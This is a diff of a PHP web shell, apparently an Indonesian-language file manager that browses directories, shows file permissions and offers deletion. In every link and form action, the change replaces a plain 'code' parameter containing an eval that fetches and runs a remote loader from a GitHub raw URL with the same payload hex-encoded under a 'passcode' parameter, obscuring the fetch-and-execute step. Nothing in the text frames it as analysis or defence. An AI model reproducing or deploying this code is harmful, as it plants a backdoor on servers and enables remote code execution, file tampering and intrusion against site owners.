@@ -180,11 +180,11 @@ $lokasinya = @scandir($lokasi);
 foreach($lokasis as $id => $lok){
 	if($lok == '' && $id == 0){
 		$a = true;
-		echo '<a href="?code=<?php%20eval(%27%20?>%27.file_get_contents(%27https://raw.githubusercontent.com/DARK-02/loader/main/mini.php%27).%27<?php%20%27);%20?>&path=/">/</a>';
+		echo '<a href="?passcode=3c3f706870206576616c2827203f3e272e66696c655f6765745f636f6e74656e7473282768747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4441524b2d30322f6c6f616465722f6d61696e2f6d696e692e70687027292e273c3f7068702027293b203f3e&path=/">/</a>';
 		continue;
 	}
 	if($lok == '') continue;
-	echo '<a href="?code=<?php%20eval(%27%20?>%27.file_get_contents(%27https://raw.githubusercontent.com/DARK-02/loader/main/mini.php%27).%27<?php%20%27);%20?>&path=';
+	echo '<a href="?passcode=3c3f706870206576616c2827203f3e272e66696c655f6765745f636f6e74656e7473282768747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4441524b2d30322f6c6f616465722f6d61696e2f6d696e692e70687027292e273c3f7068702027293b203f3e&path=';
 	for($i=0;$i<=$id;$i++){
 	echo "$lokasis[$i]";
 	if($i != $id) echo "/";
@@ -319,7 +319,7 @@ echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacin
 foreach($lokasinya as $dir){
 	if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
 	echo "<tr>
-	<td><a href=\"?code=<?php%20eval(%27%20?>%27.file_get_contents(%27https://raw.githubusercontent.com/DARK-02/loader/main/mini.php%27).%27<?php%20%27);%20?>&path=".$lokasi."/".$dir."\">".$dir."</a></td>
+	<td><a href=\"?passcode=3c3f706870206576616c2827203f3e272e66696c655f6765745f636f6e74656e7473282768747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4441524b2d30322f6c6f616465722f6d61696e2f6d696e692e70687027292e273c3f7068702027293b203f3e&path=".$lokasi."/".$dir."\">".$dir."</a></td>
 	<td><center>--</center></td>
 	<td><center>";
 	if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
@@ -328,7 +328,7 @@ foreach($lokasinya as $dir){
 	if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';
 
 	echo "</center></td>
-	<td><center><form method=\"POST\" action=\"?code=<?php%20eval(%27%20?>%27.file_get_contents(%27https://raw.githubusercontent.com/DARK-02/loader/main/mini.php%27).%27<?php%20%27);%20?>&pilihan&path=$lokasi\">
+	<td><center><form method=\"POST\" action=\"?passcode=3c3f706870206576616c2827203f3e272e66696c655f6765745f636f6e74656e7473282768747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4441524b2d30322f6c6f616465722f6d61696e2f6d696e692e70687027292e273c3f7068702027293b203f3e&pilihan&path=$lokasi\">
 	<select name=\"pilih\">
 	<option value=\"\"></option>
 	<option value=\"hapus\">Delete</option>
@@ -355,7 +355,7 @@ foreach($lokasinya as $file) {
 }
 
 echo "<tr>
-<td><a href=\"?code=<?php%20eval(%27%20?>%27.file_get_contents(%27https://raw.githubusercontent.com/DARK-02/loader/main/mini.php%27).%27<?php%20%27);%20?>&fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
+<td><a href=\"?passcode=3c3f706870206576616c2827203f3e272e66696c655f6765745f636f6e74656e7473282768747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4441524b2d30322f6c6f616465722f6d61696e2f6d696e692e70687027292e273c3f7068702027293b203f3e&fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
 <td><center>".$size."</center></td>
 <td><center>";
 if(is_writable("$lokasi/$file")) echo '<font color="green">';
@@ -363,7 +363,7 @@ elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
 echo statusnya("$lokasi/$file");
 if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
 echo "</center></td><td><center>
-<form method=\"post\" action=\"?code=<?php%20eval(%27%20?>%27.file_get_contents(%27https://raw.githubusercontent.com/DARK-02/loader/main/mini.php%27).%27<?php%20%27);%20?>&pilihan&path=$lokasi\">
+<form method=\"post\" action=\"?passcode=3c3f706870206576616c2827203f3e272e66696c655f6765745f636f6e74656e7473282768747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4441524b2d30322f6c6f616465722f6d61696e2f6d696e692e70687027292e273c3f7068702027293b203f3e&pilihan&path=$lokasi\">
 <select name=\"pilih\">
 <option value=\"\"></option>
 <option value=\"hapus\">Delete</option>
